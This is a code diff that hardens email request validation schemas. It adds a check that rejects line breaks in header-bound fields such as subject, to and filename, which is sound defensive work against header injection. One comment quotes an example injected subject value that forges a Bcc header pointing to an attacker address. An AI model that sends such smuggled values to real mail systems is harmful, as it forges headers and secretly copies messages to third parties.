@@ -815,20 +815,30 @@ export type AgentDmRequest = z.infer<typeof AgentDmRequestSchema>;
 // Email request schemas
 // ---------------------------------------------------------------------------
 
+/**
+ * Reject CR/LF in a value that will be interpolated into an RFC822 header.
+ * Without this, `subject: "hi\r\nBcc: attacker@evil.com"` forges a header on the
+ * outgoing message. Defence in depth: buildMimeMessage also throws on CR/LF.
+ */
+const noHeaderBreaks = <T extends z.ZodType<string>>(schema: T, label: string) =>
+  schema.refine((v) => !/[\r\n]/.test(v), {
+    message: `${label} must not contain line breaks`,
+  });
+
 export const EmailAttachmentSchema = z.object({
   key: z.string().min(1),
-  filename: z.string().min(1),
+  filename: noHeaderBreaks(z.string().min(1), "filename"),
   size: z.number().int().nonnegative().optional(),
-  contentType: z.string().min(1),
+  contentType: noHeaderBreaks(z.string().min(1), "contentType"),
 });
 
 export const SendEmailRequestSchema = z.object({
   agentId: z.string().min(1, "agentId is required"),
-  to: z.string().min(1, "to is required"),
-  subject: z.string().min(1, "subject is required"),
+  to: noHeaderBreaks(z.string().min(1, "to is required"), "to"),
+  subject: noHeaderBreaks(z.string().min(1, "subject is required"), "subject"),
   htmlBody: z.string().default(""),
-  inReplyTo: z.string().optional(),
-  references: z.string().optional(),
+  inReplyTo: noHeaderBreaks(z.string(), "inReplyTo").optional(),
+  references: noHeaderBreaks(z.string(), "references").optional(),
   attachments: z.array(EmailAttachmentSchema).optional(),
   customAccountId: z.string().optional(),
   from: z.string().email().optional(),
